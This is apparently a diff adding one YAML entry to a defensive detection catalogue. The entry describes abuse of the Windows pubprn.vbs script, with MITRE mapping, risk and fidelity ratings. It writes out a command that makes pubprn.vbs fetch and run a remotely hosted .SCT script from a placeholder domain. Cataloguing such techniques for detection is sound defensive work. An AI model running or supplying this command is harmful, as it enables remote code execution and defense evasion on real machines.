@@ -1,0 +1,20 @@
+- command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
+  description: Abuse pubprn.vbs to launch an arbitrary remotely-hosted .SCT script.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1216.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Scripts/Pubprn/
+    - https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/
+  risk: High
+  risk_reason: Manual usage of this script is suspicious, especially with a remote payload or URL.
+  fidelity: High
+  fidelity_reason: This is typically a rare operation in most organizations.
+  tool: pubprn
+  threatactors:
+    N/A:
+      - N/A
